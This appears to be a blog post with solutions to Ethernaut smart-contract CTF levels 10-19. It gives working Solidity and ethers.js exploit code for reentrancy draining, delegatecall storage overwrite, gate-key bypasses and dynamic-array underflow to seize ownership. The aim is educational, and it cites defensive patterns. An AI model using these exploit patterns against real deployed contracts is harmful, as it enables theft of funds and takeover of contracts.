---
title: 'Ethernaut Solutions Part 2: 10-19'
date: 2024-01-03T10:48:22+08:00
draft: false
tags: ["ctf"]
---

## Introduction

This is the Part 2 of Ethernaut Solution series:
- [Part 1](../ethernaut-solutions-part-1)
- Part 2 (Current)
- [Part 3](../ethernaut-solutions-part-3)

You can find all my solutions and local setup in this [GitHub repository](https://github.com/pkqs90/ethernaut-solutions).

This post will cover solutions for challenges 10-19. These ten challenges are somewhat more complex than the first ten. Solving them mainly involves understanding some Solidity internals (e.g. storage layouts), and basic security vulnerability patterns (e.g. reentrancy pattern).

## Solutions

### 10. Re-entrancy

This is a classic reentrancy vulnerability. There are two issues within the `withdraw()` function:
1. The transaction happens before the balance decrease
2. This line of code `balances[msg.sender] -= _amount;` does not check for integer underflow issue

So our solution is to setup a contract that calls `withdraw()` again upon ether receival:
```solidity
contract ReentrancyAttacker {

    IReentrancy challenge;

    constructor(address addr) {
        challenge = IReentrancy(addr);
    }

    function attack() public payable {
        challenge.donate{value: msg.value}(address(this));
        challenge.withdraw(msg.value);
    }

    fallback() external payable {
        uint remainingBalance = address(challenge).balance;
        if (remainingBalance > 0) {
            uint amount = remainingBalance < msg.value ? remainingBalance : msg.value;
            challenge.withdraw(amount);
        }
    }

}
```
Read [Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/v0.6.11/security-considerations.html#use-the-checks-effects-interactions-pattern) for more details on reentrancy vulnerability.

### 11. Elevator

This challenge requires us to setup a `Building` contract that returns different value for each `isLastFloor()` call. We can maintain a global state variable to track the number of times the function is called and return.

The takeaway here is still to **NOT** trust unknown external contracts, as they can execute code where you least you expect it.

```solidity
contract ElevatorAttacker {

    IElevator elevator;
    uint8 times_called = 0;

    constructor(address addr) {
        elevator = IElevator(addr);
    }

    function isLastFloor(uint) external returns (bool) {
        times_called ++;
        if (times_called == 1) {
            return false;
        }
        return true;
    }

    function attack() public {
        elevator.goTo(1);
    }

}

```

### 12. Privacy

This challenge requires us to understand the solidity storage layout.

https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#layout-of-state-variables-in-storage

Basically the rule is to pack into 32 bytes whenever possible. So the layout in the challenge contract would be:

```js
Slot 0:   bool
Slot 1:   uint256
Slot 2:   uint8, uint8, uint16
Slot 3-5: bytes32[3]
```

We can load the data in the 5th slot and retrieve the key. Another thing is that the key is in `bytes16` while storage data is `bytes32` so we need to do a conversion. Recall that fixed-size bytes behave differently during conversions compared to other types, as they take the leftmost bits intead of rightmost ones.

```js
uint32 a = 0x12345678;
uint16 b = uint16(a); // b will be 0x5678 now

bytes2 a = 0x1234;
bytes1 b = bytes1(a); // b will be 0x12
```

See https://docs.soliditylang.org/en/latest/types.html#explicit-conversions for more details.

### 13. Gatekeeper One

There are three gates we need to pass in this challenge.
1. `gateOne()` requires us to use an intermediary contract to call it.
2. `gateTwo()` requires the `gasleft()` to be divided by `8191`. Since we are playing locally, we can bruteforce the amount of gas sent.
3. `gateThree()` requires the passed in bytes8 `_gateKey` to fulfill a certain pattern:
```solidity
modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
}
```
1. Bits [32, 48) should be all zero.
2. Bits [0, 32) should be non-zero.
3. Bits [48, 64) should be equal to the last 16 bits of origin sender address.

The contract code could look something like this:
```js
it("Solves 13-GatekeeperOne", async function () {
  //...
  const [eoa] = await ethers.getSigners();
  const address = await eoa.getAddress();
  const addressLast2Bytes = address.slice(-4)
  const gateKey = `0x123456780000${addressLast2Bytes}`
  // Brute-force the gas locally.
  // const MOD = 8191;
  // const gasToUse = 100000;
  // for(let i = 0; i < MOD; i++) {
  //   console.log(`testing ${gasToUse + i}`)
  //   try {
  //     tx = await contract.attack(gateKey, gasToUse + i);
  //     break;
  //   } catch {}
  // }
  tx = await contract.attack(gateKey, 106739);
  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});

```

### 14. Gatekeeper Two

Very much similar to the challenge above.
1. `gateOne()` still requires us to use an intermediary contract to call it.
2. `gateTwo()` requires the contract's code size at caller address to be 0. This can be bypassed by calling in the contract constructor.
3. `gateThree()` again, requires the passed in bytes8 `_gateKey` to fulfill a certain pattern:

```solidity
modifier gateThree(bytes8 _gateKey) {
  	require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
  	_;
}
```

We can easily calculate the `_gateKey` by reversing the xor operation.

The contract code could look something like this:
```solidity
contract GatekeeperTwoAttacker {
    constructor(address addr) {
        IGatekeeperTwo challenge = IGatekeeperTwo(addr);
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (type(uint64).max);
        require(challenge.enter(bytes8(gateKey)));
    }
}
```

### 15. Naught Coin

The coin derives from `ERC20` in the `openzeppelin` contracts. However, it only overrides the external `transfer()` function. We know that ERC20 tokens have another method of transfering using the `approve() + transferFrom()` method which we can use in this challenge.

```js
const amount = await challenge.INITIAL_SUPPLY();
await challenge.approve(walletAddress, amount);
await challenge.connect(wallet).transferFrom(address, walletAddress, amount);
```

### 16. Preservation

We can see that the `LibraryContract` sets the slot 0 when called `setTime()`. But the slot 0 is actually where the `timeZone1Library` address is stored. So our attack vector is:
1. Call `setFirstTime()` with our exploit contract address that sets owner to ourself - this will override `timeZone1Library` to our exploit contract address.
2. Call `setFirstTime()` again and override the owner slot.

The exploit contract code could look something like this:
```solidity
contract PreservationAttacker {

    address public timeZone1Library;
    address public timeZone2Library;
    uint public owner; 

    function setTime(uint _time) public {
        owner = _time;
    }

}
```

### 17. Recovery

To solve this challenge, we need to understand how contract addresses are calculated. The challenge uses `new` to create a contract (without providing salt value), which means it is using the `create` method.

The contract address is deterministic, and is only related to deployer address and the `nonce` value (the number of times a contract creates another contract), which in this challenge, would be 1`.

https://ethereum.stackexchange.com/questions/764/do-contracts-also-have-a-nonce
https://stackoverflow.com/questions/76293617/how-to-pre-generate-an-ethereum-contract-adress

In ethers, we can simply use `getCreateAddress()` to calculate the token address.
```js
const tokenAddress = ethers.getCreateAddress({from: challengeAddress, nonce: 1});

const factory = await ethers.getContractFactory("SimpleToken");
const token = factory.attach(tokenAddress);

const [eoa] = await ethers.getSigners();
await token.destroy(await eoa.getAddress());
```

### 18. MagicNumber

We need to deploy a contract the returns 42 when called `whatIsTheMeaningOfLife()`. The contract's bytecode needs to be really small, and this can only be done in raw EVM bytecode.

Read the following post for the detailed solution.

https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2

### 19. Alien Codex

To solve this challenge, we need to understand how the storage layout works for dynamic arrays, and override the `_owner` variable which lies in slot 0.

```sol
// OpenZeppelin Ownable Contract
abstract contract Ownable is Context {
    address private _owner;
    ...
}
```

According to https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#mappings-and-dynamic-arrays, dynamic arrays are stored in continuously starting from the slot `keccak256(p)` where `p` is the allocated slot in the order of variable declaration (padded to 32 bytes).

So we can first underflow `codex.length`, then calculate the index of slot 0 according to the `codex` initial position.

```js
it("Solves 19-AlienCodex", async function () {
  //...
  await challenge.makeContact();
  await challenge.retract();

  // Array data is stored in keccak256(p), keccak256(p)+1, keccak256(p)+2, ... where p is the allocated slot
  // in the order of variable declaration (padded to 32 bytes).
  // https://docs.soliditylang.org/en/v0.8.23/internals/layout_in_storage.html#mappings-and-dynamic-arrays
  const startingPosition = BigInt(ethers.solidityPackedKeccak256(["uint256"], [1]));
  const delta = 2n**256n - startingPosition;
  const addressBytes32 = ethers.AbiCoder.defaultAbiCoder().encode(["address"], [userAddress]);
  await challenge.revise(delta, addressBytes32);

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});

```